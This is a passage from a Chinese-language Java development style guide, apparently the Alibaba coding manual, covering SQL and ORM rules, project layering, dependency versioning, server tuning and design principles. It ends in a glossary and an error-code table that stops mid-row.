\n\n9. <font color=\" #C00000\">【强制】</font>对于数据库中表记录的查询和变更，只要涉及多个表，都需要在列名前加表的别名（或表名）进行限定。\n\n   <font color=\" #977C00\">说明：</font>对多表进行查询记录、更新记录、删除记录时，如果对操作列没有限定表的别名（或表名），并且操作列在多个表中存在时，就会抛异常。\n\n   <font color=\"#019858\">正例：</font>select t1.name from table\\_first as t1 , table\\_second as t2 where t1.id=t2.id;    \n\n   <font color=\" #FF4500\">反例：</font>在某业务中，由于多表关联查询语句没有加表的别名（或表名）的限制，正常运行两年后，最近在 某个表中增加一个同名字段，在预发布环境做数据库变更后，线上查询语句出现出 1052 异常：Column 'name' in field list is ambiguous。 \n\n10. <font color=\" #FFC000\">【推荐】</font>SQL 语句中表的别名前加 as，并且以 t1、t2、t3、...的顺序依次命名。\n\n    <font color=\" #977C00\">说明：</font>\n\n    1）别名可以是表的简称，或者是依照表在 SQL 语句中出现的顺序，以 t1、t2、t3 的方式命名。\n\n    2） 别名前加 as 使别名更容易识别。\n\n    <font color=\"#019858\">正例：</font>select t1.name from table\\_first as t1, table\\_second as t2 where t1.id=t2.id;\n\n11. <font color=\" #FFC000\">【推荐】</font>in 操作能避免则避免，若实在避免不了，需要仔细评估 in 后边的集合元素数量，控制在 1000 个之内。 \n\n12. <font color=\"#76923C\">【参考】</font>因国际化需要，所有的字符存储与表示，均采用 utf8 字符集，那么字符计数方法需 要注意。 \n\n    <font color=\" #977C00\">说明：</font> \n\n    ```sql\n    SELECT LENGTH(\"轻松工作\");  返回为 12 \n    SELECT CHARACTER_LENGTH(\"轻松工作\"); 返回为 4 \n    ```\n\n    如果需要存储表情，那么选择 utf8mb4 来进行存储，注意它与 utf8 编码的区别。\n\n13. <font color=\"#76923C\">【参考】</font>TRUNCATE TABLE  比  DELETE  速度快，且使用的系统和事务日志资源少，但 TRUNCATE 无事务且不触发 trigger，有可能造成事故，故不建议在开发代码中使用此语句。\n\n    <font color=\" #977C00\">说明：</font>TRUNCATE TABLE 在功能上与不带  WHERE  子句的  DELETE 语句相同。\n\n## (四)  ORM 映射\n\n1. <font color=\" #C00000\">【强制】</font>在表查询中，一律不要使用  \\* 作为查询的字段列表，需要哪些字段必须明确写明。\n\n   <font color=\" #977C00\">说明：</font>\n\n   1）增加查询分析器解析成本。\n\n   2）增减字段容易与 resultMap 配置不一致。\n\n   3）无用字段增加网络 消耗，尤其是 text 类型的字段。\n\n2. <font color=\" #C00000\">【强制】</font>POJO 类的布尔属性不能加 is，而数据库字段必须加 is\\_，要求在 resultMap 中进行字段与属性之间的映射。\n\n   <font color=\" #977C00\">说明：</font>参见定义 POJO 类以及数据库字段定义规定，在 sql.xml 增加映射，是必须的。\n\n3. <font color=\" #C00000\">【强制】</font>不要用 resultClass 当返回参数，即使所有类属性名与数据库字段一一对应，也需要 定义<resultMap>；反过来，每一个表也必然有一个<resultMap>与之对应。\n\n   <font color=\" #977C00\">说明：</font>配置映射关系，使字段与 DO 类解耦，方便维护。\n\n4. <font color=\" #C00000\">【强制】</font>sql.xml 配置参数使用：#{}，#param#  不要使用${} 此种方式容易出现 SQL 注入。 \n\n5. <font color=\" #C00000\">【强制】</font>iBATIS自带的 queryForList(String statementName,int start,int size)不推荐使用。    \n\n   <font color=\" #977C00\">说明：</font>其实现方式是在数据库取到 statementName 对应的 SQL 语句的所有记录，再通过 subList 取 start,size 的子集合。\n\n   <font color=\"#019858\">正例：</font> \n\n   ```sql\n   Map<String, Object> map = new HashMap<>(16); \n   map.put(\"start\", start); \n   map.put(\"size\", size); \n   ```\n\n   \n\n6. <font color=\" #C00000\">【强制】</font>不允许直接拿 HashMap 与 Hashtable 作为查询结果集的输出。    \n\n   <font color=\" #FF4500\">反例：</font>某同学为避免写一个<resultMap>xxx</resultMap>，直接使用 HashTable 来接收数据库返回结果，结果出现日常是把 bigint 转成 Long 值，而线上由于数据库版本不一样，解析成 BigInteger，导致线上问题。 \n\n7. <font color=\" #C00000\">【强制】</font>更新数据表记录时，必须同时更新记录对应的 update\\_time 字段值为当前时间。\n\n8. <font color=\" #FFC000\">【推荐】</font>不要写一个大而全的数据更新接口。传入为 POJO 类，不管是不是自己的目标更新字 段，都进行 update table set c1=value1,c2=value2,c3=value3;  这是不对的。执行 SQL 时， 不要更新无改动的字段，一是易出错；二是效率低；三是增加 binlog 存储。 \n\n9. <font color=\"#76923C\">【参考】</font>@Transactional 事务不要滥用。事务会影响数据库的 QPS，另外使用事务的地方需 要考虑各方面的回滚方案，包括缓存回滚、搜索引擎回滚、消息补偿、统计修正等。\n\n10. <font color=\"#76923C\">【参考】</font>`<isEqual>`中的 compareValue 是与属性值对比的常量，一般是数字，表示相等时带上此条件；`<isNotEmpty>`表示不为空且不为 null 时执行；`<isNotNull>`表示不为 null 值 时执行。 \n\n# 六、工程结构\n\n## (一)  应用分层\n\n1. <font color=\" #FFC000\">【推荐】</font>根据业务架构实践，结合业界分层规范与流行技术框架分析，推荐分层结构如图所示， 默认上层依赖于下层，箭头关系表示可直接依赖，如：开放 API 层可以依赖于 Web 层 （Controller 层），也可以直接依赖于 Service 层，依此类推 \n\n   ![](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/c1388515-ad59-431d-8473-6b507ce22f68.jpeg)  \n\n   - 开放 API 层：可直接封装 Service 接口暴露成 RPC 接口；通过 Web 封装成 http 接口；网关控制层等。\n\n    - 终端显示层：各个端的模板渲染并执行显示的层。当前主要是 velocity 渲染，JS 渲染，JSP 渲染，移 动端展示等。\n\n\n    - Web 层：主要是对访问控制进行转发，各类基本参数校验，或者不复用的业务简单处理等。\n\n\n    - Service 层：相对具体的业务逻辑服务层。\n\n\n    - Manager 层：通用业务处理层，它有如下特征：\n    \n       1） 对第三方平台封装的层，预处理返回结果及转化异常信息，适配上层接口。\n    \n       2） 对 Service 层通用能力的下沉，如缓存方案、中间件通用处理。\n    \n       3） 与 DAO 层交互，对多个 DAO 的组合复用。\n\n\n    - DAO 层：数据访问层，与底层 MySQL、Oracle、Hbase、OB 等进行数据交互。\n    \n    - 第三方服务：包括其它部门 RPC 服务接口，基础平台，其它公司的 HTTP 接口，如淘宝开放平台、支 付宝付款服务、高德地图服务等。\n    \n    - 外部数据接口：外部（应用）数据存储服务提供的接口，多见于数据迁移场景中。\n\n2. <font color=\"#76923C\">【参考】</font>（分层异常处理规约）在 DAO 层，产生的异常类型有很多，无法用细粒度的异常进行 catch，使用 ==catch(Exception e)方式，并 throw new DAOException(e)==，不需要打印日志，因 为日志在 Manager/Service 层一定需要捕获并打印到日志文件中去，如果同台服务器再打日志，浪费性能和存储。在 Service 层出现异常时，必须记录出错日志到磁盘，尽可能带上参数信息， 相当于保护案发现场。Manager 层与 Service 同机部署，日志方式与 DAO 层处理一致，如果是 单独部署，则采用与 Service 一致的处理方式。Web 层绝不应该继续往上抛异常，因为已经处于顶层，如果意识到这个异常将导致页面无法正常渲染，那么就应该直接跳转到友好错误页面， 尽量加上友好的错误提示信息。开放接口层要将异常处理成错误码和错误信息方式返回。\n\n3. <font color=\"#76923C\">【参考】</font>分层领域模型规约：\n\n   - DO（Data Object）：此对象与数据库表结构一一对应，通过 DAO 层向上传输数据源对象。 \n\n   - DTO（Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。 \n\n   - BO（Business Object）：业务对象，可以由 Service 层输出的封装业务逻辑的对象。 \n\n   - Query：数据查询对象，各层接收上层的查询请求。注意超过 2 个参数的查询封装，禁止使用 Map 类 来传输。 \n\n   - VO（View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。\n\n\n## (二)  二方库依赖\n\n1. <font color=\" #C00000\">【强制】</font>定义 GAV遵从以下规则：\n\n   - **GroupID 格式**：com.{公司/BU }.业务线  [.子业务线]，最多 4 级。 \n\n     <font color=\" #977C00\">说明：</font>{公司/BU}  例如：alibaba/taobao/tmall/aliexpress 等 BU 一级；子业务线可选。       \n\n     <font color=\"#019858\">正例：</font>com.taobao.jstorm  或 com.alibaba.dubbo.register  \n\n   - **ArtifactID 格式**：产品线名-模块名。语义不重复不遗漏，先到中央仓库去查证一下。       \n\n     <font color=\"#019858\">正例：</font>dubbo-client / fastjson-api / jstorm-tool \n\n   - **Version**：详细规定参考下方。\n\n2. <font color=\" #C00000\">【强制】</font>二方库版本号命名方式：主版本号.次版本号.修订号 \n\n   1）主版本号：产品方向改变，或者大规模 API 不兼容，或者架构不兼容升级。  \n\n   2） 次版本号：保持相对兼容性，增加主要功能特性，影响范围极小的 API 不兼容修改。\n\n   3） 修订号：保持完全兼容性，修复 BUG、新增次要功能特性等。\n\n   <font color=\" #977C00\">说明：</font>注意起始版本号必须为：1.0.0，而不是 0.0.1。 \n\n   <font color=\" #FF4500\">反例：</font>仓库内某二方库版本号从 1.0.0.0 开始，一直默默“升级”成 1.0.0.64，完全失去版本的语义信息。\n\n3. <font color=\" #C00000\">【强制】</font>线上应用不要依赖 SNAPSHOT 版本（安全包除外）；正式发布的类库必须先去中央仓 库进行查证，使 RELEASE版本号有延续性，且版本号不允许覆盖升级。\n\n   <font color=\" #977C00\">说明：</font>不依赖 SNAPSHOT 版本是保证应用发布的幂等性。另外，也可以加快编译时的打包构建。\n\n4. <font color=\" #C00000\">【强制】</font>二方库的新增或升级，保持除功能点之外的其它 jar 包仲裁结果不变。如果有改变， 必须明确评估和验证。 \n\n   <font color=\" #977C00\">说明：</font>在升级时，进行 dependency:resolve 前后信息比对，如果仲裁结果完全不一致，那么通过 dependency:tree 命令，找出差异点，进行`<exclude>`排除 jar 包。\n\n5. <font color=\" #C00000\">【强制】</font>二方库里可以定义枚举类型，参数可以使用枚举类型，但是接口返回值不允许使用枚举类型或者包含枚举类型的 POJO 对象。 \n\n6. <font color=\" #C00000\">【强制】</font>依赖于一个二方库群时，必须定义一个统一的版本变量，避免版本号不一致。\n\n   <font color=\" #977C00\">说明：</font>依赖 springframework-core,-context,-beans，它们都是同一个版本，可以定义一个变量来保存版本：${spring.version}，定义依赖的时候，引用该版本。\n\n7. <font color=\" #C00000\">【强制】</font>禁止在子项目的 pom 依赖中出现相同的 GroupId，相同的 ArtifactId，但是不同的 Version。 \n\n   <font color=\" #977C00\">说明：</font>在本地调试时会使用各子项目指定的版本号，但是合并成一个 war，只能有一个版本号出现在最后的 lib 目录中。曾经出现过线下调试是正确的，发布到线上却出故障的先例。\n\n8. <font color=\" #FFC000\">【推荐】</font>底层基础技术框架、核心数据管理平台、或近硬件端系统谨慎引入第三方实现。\n\n9. <font color=\" #FFC000\">【推荐】</font>所有 pom 文件中的依赖声明放在`<dependencies>`语句块中，所有版本仲裁放在`<dependencyManagement>`语句块中。\n\n   <font color=\" #977C00\">说明：</font>`<dependencyManagement>`里只是声明版本，并不实现引入，因此子项目需要显式的声明依赖， version 和 scope 都读取自父 pom。而`<dependencies>`所有声明在主 pom 的`<dependencies>`的依赖都会自动引入，并默认被所有的子项目继承。\n\n10. <font color=\" #FFC000\">【推荐】</font>二方库不要有配置项，最低限度不要再增加配置项。\n\n11. <font color=\" #FFC000\">【推荐】</font>不要使用不稳定的工具包或者 Utils 类。 \n\n     <font color=\" #977C00\">说明：</font>不稳定指的是提供方无法做到向下兼容，在编译阶段正常，但在运行时产生异常，因此，尽量使用 业界稳定的二方工具包。\n\n12. <font color=\"#76923C\">【参考】</font>为避免应用二方库的依赖冲突问题，二方库发布者应当遵循以下原则：\n\n    1）**精简可控原则**。移除一切不必要的 API 和依赖，只包含  Service API、必要的领域模型对象、Utils 类、 常量、枚举等。如果依赖其它二方库，尽量是 provided 引入，让二方库使用者去依赖具体版本号；无 log 具体实现，只依赖日志框架。2）**稳定可追溯原则**。每个版本的变化应该被记录，二方库由谁维护，源码在哪里，都需要能方便查到。除非用户主动升级版本，否则公共二方库的行为不应该发生变化。\n\n## (三)  服务器 \n\n1. <font color=\" #FFC000\">【推荐】</font>高并发服务器建议调小TCP 协议的 time\\_wait 超时时间。 \n\n   <font color=\" #977C00\">说明：</font>操作系统默认 240 秒后，才会关闭处于 time\\_wait 状态的连接，在高并发访问下，服务器端会因为 处于 time\\_wait 的连接数太多，可能无法建立新的连接，所以需要在服务器上调小此等待值。 \n\n    <font color=\"#019858\">正例：</font>在 linux 服务器上请通过变更`/etc/sysctl.conf `文件去修改该缺省值（秒）：  `net.ipv4.tcp\\_fin\\_timeout = 30`\n\n2. <font color=\" #FFC000\">【推荐】</font>调大服务器所支持的最大文件句柄数（File Descriptor，简写为 fd）。    \n\n   <font color=\" #977C00\">说明：</font>主流操作系统的设计是将 TCP/UDP 连接采用与文件一样的方式去管理，即一个连接对应于一个 fd。 主流的 linux 服务器默认所支持最大 fd 数量为 1024，当并发连接数很大时很容易因为 fd 不足而出现“open too many files”错误，导致新的连接无法建立。建议将 linux 服务器所支持的最大句柄数调高数倍（与服务器的内存数量相关）。\n\n3. <font color=\" #FFC000\">【推荐】</font>给 JVM环境参数设置`-XX:+HeapDumpOnOutOfMemoryError`参数，让 JVM碰到 OOM 场景时输出 dump 信息。 \n\n   <font color=\" #977C00\">说明：</font>OOM 的发生是有概率的，甚至相隔数月才出现一例，出错时的堆内信息对解决问题非常有帮助。\n\n4. <font color=\" #FFC000\">【推荐】</font>在线上生产环境，JVM 的 Xms 和 Xmx 设置一样大小的内存容量，避免在 GC  后调整堆大小带来的压力。\n\n5. <font color=\"#76923C\">【参考】</font>服务器内部重定向必须使用 forward；外部重定向地址必须使用 URL Broker 生成，否 则因线上采用 HTTPS 协议而导致浏览器提示“不安全“。此外，还会带来 URL维护不一致的 问题。 \n\n# 七、设计规约\n\n1. <font color=\" #C00000\">【强制】</font>存储方案和底层数据结构的设计获得评审一致通过，并沉淀成为文档。\n\n   <font color=\" #977C00\">说明：</font>有缺陷的底层数据结构容易导致系统风险上升，可扩展性下降，重构成本也会因历史数据迁移和系 统平滑过渡而陡然增加，所以，存储方案和数据结构需要认真地进行设计和评审，生产环境提交执行后， 需要进行 double check。     \n\n   <font color=\"#019858\">正例：</font>评审内容包括存储介质选型、表结构设计能否满足技术方案、存取性能和存储空间能否满足业务发 展、表或字段之间的辩证关系、字段名称、字段类型、索引等；数据结构变更（如在原有表中新增字段） 也需要进行评审通过后上线。\n\n2. <font color=\" #C00000\">【强制】</font>在需求分析阶段，如果与系统交互的 User 超过一类并且相关的 User Case 超过 5 个， 使用用例图来表达更加清晰的结构化需求。\n\n3. <font color=\" #C00000\">【强制】</font>如果某个业务对象的状态超过 3 个，使用状态图来表达并且明确状态变化的各个触发 条件。 \n\n   <font color=\" #977C00\">说明：</font>状态图的核心是对象状态，首先明确对象有多少种状态，然后明确两两状态之间是否存在直接转换 关系，再明确触发状态转换的条件是什么。     \n\n   <font color=\"#019858\">正例：</font>淘宝订单状态有已下单、待付款、已付款、待发货、已发货、已收货等。比如已下单与已收货这两 种状态之间是不可能有直接转换关系的。\n\n4. <font color=\" #C00000\">【强制】</font>如果系统中某个功能的调用链路上的涉及对象超过 3 个，使用时序图来表达并且明确 各调用环节的输入与输出。    <font color=\" #977C00\">说明：</font>时序图反映了一系列对象间的交互与协作关系，清晰立体地反映系统的调用纵深链路。\n\n5. <font color=\" #C00000\">【强制】</font>如果系统中模型类超过 5 个，并且存在复杂的依赖关系，使用类图来表达并且明确类之间的关系。\n\n   <font color=\" #977C00\">说明：</font>类图像建筑领域的施工图，如果搭平房，可能不需要，但如果建造空间大楼，肯定需要详细的施工图。\n\n6. <font color=\" #C00000\">【强制】</font>如果系统中超过 2 个对象之间存在协作关系，并且需要表示复杂的处理流程，使用活动图来表示。\n\n   <font color=\" #977C00\">说明：</font>活动图是流程图的扩展，增加了能够体现协作关系的对象泳道，支持表示并发等。\n\n7. <font color=\" #FFC000\">【推荐】</font>系统架构设计时明确以下目标：\n\n   - 确定系统边界。确定系统在技术层面上的做与不做。\n\n   - 确定系统内模块之间的关系。确定模块之间的依赖关系及模块的宏观输入与输出。\n\n   - 确定指导后续设计与演化的原则。使后续的子系统或模块设计在一个既定的框架内和技术方向上继 续演化。 \n\n\n   - 确定非功能性需求。非功能性需求是指安全性、可用性、可扩展性等。\n\n8. <font color=\" #FFC000\">【推荐】</font>需求分析与系统设计在考虑主干功能的同时，需要充分评估异常流程与业务边界。\n\n   <font color=\" #FF4500\">反例：</font>用户在淘宝付款过程中，银行扣款成功，发送给用户扣款成功短信，但是支付宝入款时由于断网演 练产生异常，淘宝订单页面依然显示未付款，导致用户投诉。\n\n9. <font color=\" #FFC000\">【推荐】</font>类在设计与实现时要符合单一原则。\n\n   <font color=\" #977C00\">说明：</font>单一原则最易理解却是最难实现的一条规则，随着系统演进，很多时候，忘记了类设计的初衷。\n\n10. <font color=\" #FFC000\">【推荐】</font>谨慎使用继承的方式来进行扩展，优先使用聚合/组合的方式来实现。\n\n    <font color=\" #977C00\">说明：</font>不得已使用继承的话，必须符合里氏代换原则，此原则说父类能够出现的地方子类一定能够出现， 比如，“把钱交出来”，钱的子类美元、欧元、人民币等都可以出现。\n\n11. <font color=\" #FFC000\">【推荐】</font>系统设计阶段，根据依赖倒置原则，尽量依赖抽象类与接口，有利于扩展与维护。\n\n    <font color=\" #977C00\">说明：</font>低层次模块依赖于高层次模块的抽象，方便系统间的解耦。\n\n12. <font color=\" #FFC000\">【推荐】</font>系统设计阶段，注意对扩展开放，对修改闭合。\n\n    <font color=\" #977C00\">说明：</font>极端情况下，交付的代码是不可修改的，同一业务域内的需求变化，通过模块或类的扩展来实现。\n\n13. <font color=\" #FFC000\">【推荐】</font>系统设计阶段，共性业务或公共行为抽取出来公共模块、公共配置、公共类、公共方 法等，在系统中不出现重复代码的情况，即 DRY原则（Don't Repeat Yourself）。    \n\n    <font color=\" #977C00\">说明：</font>随着代码的重复次数不断增加，维护成本指数级上升。随意复制和粘贴代码，必然会导致代码的重复， 在维护代码时，需要修改所有的副本，容易遗漏。必要时抽取共性方法，或者抽象公共类，甚至是组件化。 \n\n    <font color=\"#019858\">正例：</font>一个类中有多个 public 方法，都需要进行数行相同的参数校验操作，这个时候请抽取：\n\n    ```java\n    private boolean checkParam(DTO dto) {\n        ...\n    } \n    ```\n\n14. <font color=\" #FFC000\">【推荐】</font>避免如下误解：敏捷开发  =  讲故事  +  编码  +  发布。 \n\n    <font color=\" #977C00\">说明：</font>敏捷开发是快速交付迭代可用的系统，省略多余的设计方案，摒弃传统的审批流程，但核心关键点上 的必要设计和文档沉淀是需要的。    \n\n    <font color=\" #FF4500\">反例：</font>某团队为了业务快速发展，敏捷成了产品经理催进度的借口，系统中均是勉强能运行但像面条一样 的代码，可维护性和可扩展性极差，一年之后，不得不进行大规模重构，得不偿失。 \n\n15. <font color=\"#76923C\">【参考】</font>设计文档的作用是明确需求、理顺逻辑、后期维护，次要目的用于指导编码。    \n\n    <font color=\" #977C00\">说明：</font>避免为了设计而设计，系统设计文档有助于后期的系统维护和重构，所以设计结果需要进行分类归 档保存。\n\n16. <font color=\"#76923C\">【参考】</font>可扩展性的本质是找到系统的变化点，并隔离变化点。\n\n    <font color=\" #977C00\">说明：</font>世间众多设计模式其实就是一种设计模式即隔离变化点的模式。     \n\n    <font color=\"#019858\">正例：</font>极致扩展性的标志，就是需求的新增，不会在原有代码交付物上进行任何形式的修改。\n\n17. <font color=\"#76923C\">【参考】</font>设计的本质就是识别和表达系统难点。 \n\n    <font color=\" #977C00\">说明：</font>识别和表达完全是两回事，很多人错误地认为识别到系统难点在哪里，表达只是自然而然的事情， 但是大家在设计评审中经常出现语焉不详，甚至是词不达意的情况。准确地表达系统难点需要具备如下能 力：  表达规则和表达工具的熟练性。抽象思维和总结能力的局限性。基础知识体系的完备性。深入浅出的 生动表达力。\n\n18. <font color=\"#76923C\">【参考】</font>代码即文档的观点是错误的，清晰的代码只是文档的某个片断，而不是全部。\n\n    <font color=\" #977C00\">说明：</font>代码的深度调用，模块层面上的依赖关系网，业务场景逻辑，非功能性需求等问题是需要相应的文 档来完整地呈现的。\n\n19. <font color=\"#76923C\">【参考】</font>在做无障碍产品设计时，需要考虑到：\n\n    - 所有可交互的控件元素必须能被 tab 键聚焦，并且焦点顺序需符合自然操作逻辑。 \n\n    - 用于登录校验和请求拦截的验证码均需提供图形验证以外的其它方式。 \n\n    - 自定义的控件类型需明确交互方式。\n\n    <font color=\"#019858\">正例：</font>用户登录场景中，输入框的按钮都需要考虑 tab 键聚焦，符合自然逻辑的操作顺序如下，“输入用 户名，输入密码，输入验证码，点击登录”，其中验证码实现语音验证方式。如果有自定义标签实现的控 件设置控件类型可使用 role 属性。   \n\n# 附录\n\n## 附录1：专有名词解释\n\n1. POJO（Plain Ordinary Java Object）:  在本规约中，POJO 专指只有 setter/getter/toString 的 简单类，包括 DO/DTO/BO/VO 等。 \n1. DO（Data Object）：阿里巴巴专指数据库表一一对应的 POJO 类。此对象与数据库表结构一 一对应，通过 DAO 层向上传输数据源对象。\n1. DTO（Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。\n1. BO（Business Object）：业务对象，可以由 Service 层输出的封装业务逻辑的对象。\n1. Query：数据查询对象，各层接收上层的查询请求。注意超过 2 个参数的查询封装，禁止使用 Map 类来传输。\n1. VO（View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。\n1. AO（Application Object）:  阿里巴巴专指 Application Object，即在 Service 层上，极为贴近 业务的复用代码。\n1. CAS（Compare And Swap）：解决多线程并行情况下使用锁造成性能损耗的一种机制，这是 硬件实现的原子操作。CAS 操作包含三个操作数：内存位置、预期原值和新值。如果内存位 置的值与预期原值相匹配，那么处理器会自动将该位置值更新为新值。否则，处理器不做任何 操作。 \n1. GAV（GroupId、ArtifactId、Version）: Maven 坐标，是用来唯一标识 jar 包。 \n1. OOP（Object Oriented Programming）:  本文泛指类、对象的编程处理方式。\n1. AQS（AbstractQueuedSynchronizer）:  利用先进先出队列实现的底层同步工具类，它是很多上 层同步实现类的基础，比如：ReentrantLock、CountDownLatch、Semaphore 等，它们通 过继承 AQS 实现其模版方法，然后将 AQS 子类作为同步组件的内部类，通常命名为 Sync。 \n1. ORM（Object Relation Mapping）:  对象关系映射，对象领域模型与底层数据之间的转换，本 文泛指 iBATIS, mybatis 等框架。 \n1. NPE（java.lang.NullPointerException）:  空指针异常。\n1. OOM（Out Of Memory）:  源于  java.lang.OutOfMemoryError，当  JVM  没有足够的内存 来为对象分配空间并且垃圾回收器也无法回收空间时，系统出现的严重状况。\n1. 一方库: 本工程内部子项目模块依赖的库（jar 包）。 \n1. 二方库: 公司内部发布到中央仓库，可供公司内部其它应用依赖的库（jar 包）。 \n1. 三方库: 公司之外的开源库（jar 包）。 \n\n## 附录2：错误码列表\n\n| 错误码 | 中文描述                       | 说明             |\n| ------ | ------------------------------ | ---------------- |\n| 00000  | 一切 ok                        | 正确执行后的返回 |\n| A0001  | 用户端错误                     | 一级宏观错误码   |\n| A0100  | 用户注册错误                   | 二级宏观错误码   |\n| A0101  | 用户未同意隐私协议             |                  |\n| A0102  | 注册国家或地区受限             |                  |\n| A0110  | 用户名校验失败                 |                  |\n| A0111  | 用户名已存在                   |                  |\n| A0112  | 用户名包含敏感词               |                  |\n| A0113  | 用户名包含特殊字符             |                  |\n| A0120  | 密码校验失败                   |                  |\n| A0121  | 密码长度不够                   |                  |\n| A0122  | 密码强度不够                   |                  |\n| A0130  | 校验码输入错误                 |                  |\n| A0131  | 短信校验码输入错误             |                  |\n| A0132  | 邮件校验码输入错误             |                  |\n| A0133  | 语音校验码输入错误             |                  |\n| A0140  | 用户证件异常                   |                  |\n| A0141  | 用户证件类型未选择             |                  |\n| A0142  | 大陆身份证编号校验非法         |                  |\n| A0143  | 护照编号校验非法               |                  |\n| A0144  | 军官证编号校验非法             |                  |\n| A0150  | 用户基本信息校验失败           |                  |\n| A0151  | 手机格式校验失败               |                  |\n| A0152  | 地址格式校验失败               |                  |\n| A0153  | 邮箱格式校验失败               |                  |\n| A0200  | 用户登录异常                   | 二级宏观错误码   |\n| A0201  | 用户账户不存在                 |                  |\n| A0202  | 用户账户被冻结                 |                  |\n| A0203  | 用户账户已作废                 |                  |\n| A0210  | 用户密码错误                   |                  |\n| A0211  | 用户输入密码错误次数超限       |                  |\n| A0220  | 用户身份校验失败               |                  |\n| A0221  | 用户指纹识别失败               |                  |\n| A0222  | 用户面容识别失败               |                  |\n| A0223  | 用户未获得第三方登录授权       |                  |\n| A0230  | 用户登录已过期                 |                  |\n| A0240  | 用户验证码错误                 |                  |\n| A0241  | 用户验证码尝试次数超限         |                  |\n| A0300  | 访问权限异常                   |                  |\n| A0301  | 访问未授权                     |                  |\n| A0302  | 正在授权中                     |                  |\n| A0303  | 用户授权申请被拒绝             |                  |\n| A0310  | 因访问对象隐私设置被拦截       |                  |\n| A0311  | 授权已过期                     |                  |\n| A0312  | 无权限使用API                  |                  |\n| A0320  | 用户访问被拦截                 |                  |\n| A0321  | 黑名单用户                     |                  |\n| A0322  | 账号被冻结                     |                  |\n| A0323  | 非法IP地址                     |                  |\n| A0324  | 网关访问受限                   |                  |\n| A0325  | 地域黑名单                     |                  |\n| A0330  | 服务已欠费                     |                  |\n| A0340  | 用户签名异常                   |                  |\n| A0341  | RSA签名错误                    |                  |\n| A0400  | 用户请求参数错误               | 二级宏观错误码   |\n| A0401  | 包含非法恶意跳转链接           |                  |\n| A0402  | 无效的用户输入                 |                  |\n| A0410  | 请求必填参数为空               |                  |\n| A0411  | 用户订单号为空                 |                  |\n| A0412  | 订购数量为空                   |                  |\n| A0413  | 缺少时间戳参数                 |                  |\n| A0414  | 非法的时间戳参数               |                  |\n| A0420  | 请求参数值超出允许的范围       |                  |\n| A0421  | 参数格式不匹配                 |                  |\n| A0422  | 地址不在服务范围               |                  |\n| A0423  | 时间不在服务范围               |                  |\n| A0424  | 金额超出限制                   |                  |\n| A0425  | 数量超出限制                   |                  |\n| A0426  | 请求批量处理总个数超出限制     |                  |\n| A0427  | 请求 JSON 解析失败             |                  |\n| A0430  | 用户输入内容非法               |                  |\n| A0431  | 包含违禁敏感词                 |                  |\n| A0432  | 图片包含违禁信息               |                  |\n| A0433  | 文件侵犯版权                   |                  |\n| A0440  | 用户操作异常                   |                  |\n| A0441  | 用户支付超时                   |                  |\n| A0442  | 确认订单超时                   |                  |\n| A0443  | 订单已关闭                     |                  |\n| A0500  | 用户请求服务异常               |                  |\n| A0501  | 请求次数超出限制               |                  |\n| A0502  | 请求并发数超出限制             |                  |\n| A0503  | 用户操作请等待                 |                  |\n| A0504  | WebSocket 连接异常             |                  |\n| A0505  | WebSocket 连接断开             |                  |\n| A0506  | 用户重复请求                   |                  |\n| A0600  | 用户资源异常                   |                  |\n| A0601  | 账户余额不足                   |                  |\n| A0602  | 用户磁盘空间不足               |                  |\n| A0603  | 用户内存空间不足               |                  |\n| A0604  | 用户 OSS 容量不足              |                  |\n| A0605  | 用户配额已用光                 |                  |\n| A0700  | 用户上传文件异常               |                  |\n| A0701  | 用户上传文件类型不匹配         |                  |\n| A0702  | 用户上传文件太大               |                  |\n| A0703  | 用户上传图片太大               |                  |\n| A0704  | 用户上传视频太大               |                  |\n| A0705  | 用户上传压缩文件太大           |                  |\n| A0800  | 用户当前版本异常               | 二级宏观错误码   |\n| A0801  | 用户安装版本与系统不匹配       |                  |\n| A0802  | 用户安装版本过低               |                  |\n| A0803  | 用户安装版本过高               |                  |\n| A0804  | 用户安装版本已过期             |                  |\n| A0805  | 用户 API 请求版本不匹配        |                  |\n| A0806  | 用户 API 请求版本过高          |                  |\n| A0807  | 用户 API 请求版本过低          |                  |\n| A0900  | 用户隐私未授权                 | 二级宏观错误码   |\n| A0901  | 用户隐私未签署                 |                  |\n| A0902  | 用户摄像头未授权               |                  |\n| A0903  | 用户相机未授权                 |                  |\n| A0904  | 用户图片库未授权               |                  |\n| A0905  | 用户文件未授权                 |                  |\n| A0906  | 用户位置信息未授权             |                  |\n| A0907  | 用户通讯录未授权               |                  |\n| A1000  | 用户设备异常                   | 二级宏观错误码   |\n| A1001  | 用户相机异常                   |                  |\n| A1002  | 用户麦克风异常                 |                  |\n| A1003  | 用户听筒异常                   |                  |\n| A1004  | 用户扬声器异常                 |                  |\n| A1005  | 用户 GPS 定位异常              |                  |\n| B0001  | 系统执行出错                   | 一级宏观错误码   |\n| B0100  | 系统执行超时                   | 二级宏观错误码   |\n| B0101  | 系统订单处理超时               |                  |\n| B0200  | 系统容灾功能被触发             | 二级宏观错误码   |\n| B0210  | 系统限流                       |                  |\n| B0220  | 系统功能降级                   |                  |\n| B0300  | 系统资源异常                   | 二级宏观错误码   |\n| B0310  | 系统资源耗尽                   |                  |\n| B0311  | 系统磁盘空间耗尽               |                  |\n| B0312  | 系统内存耗尽                   |                  |\n| B0313  | 文件句柄耗尽                   |                  |\n| B0314  | 系统连接池耗尽                 |                  |\n| B0315  | 系统线程池耗尽                 |                  |\n| B0320  | 系统资源访问异常               |                  |\n| B0321  | 系统读取磁盘文件失败           |                  |\n| C0001  | 调用第三方服务出错             | 一级宏观错误码   |\n| C0100  | 中间件服务出错                 | 二级宏观错误码   |\n| C0110  | RPC 服务出错                   |                  |\n| C0111  | RPC 服务未找到                 |                  |\n| C0112  | RPC 服务未注册                 |                  |\n| C0113  | 接口不存在                     |                  |\n| C0120  | 消息服务出错                   |                  |\n| C0121  | 消息投递出错                   |                  |\n| C0122  | 消息消费出错                   |                  |\n| C0123  | 消息订阅出错                   |                  |\n| C0124  | 消息分组未查到                 |                  |\n| C0130  | 缓存服务出错                   |                  |\n| C0131  | key 长度超过限制               |                  |\n| C0132  | value 长度超过限制             |                  |\n| C0133  | 存储容量已满                   |                  |\n| C0134  | 不支持的数据格式               |                  |\n| C0140  | 配置服务出错                   |                  |\n| C0150  | 网络资源服务出错               |                  |\n| C0151  | VPN 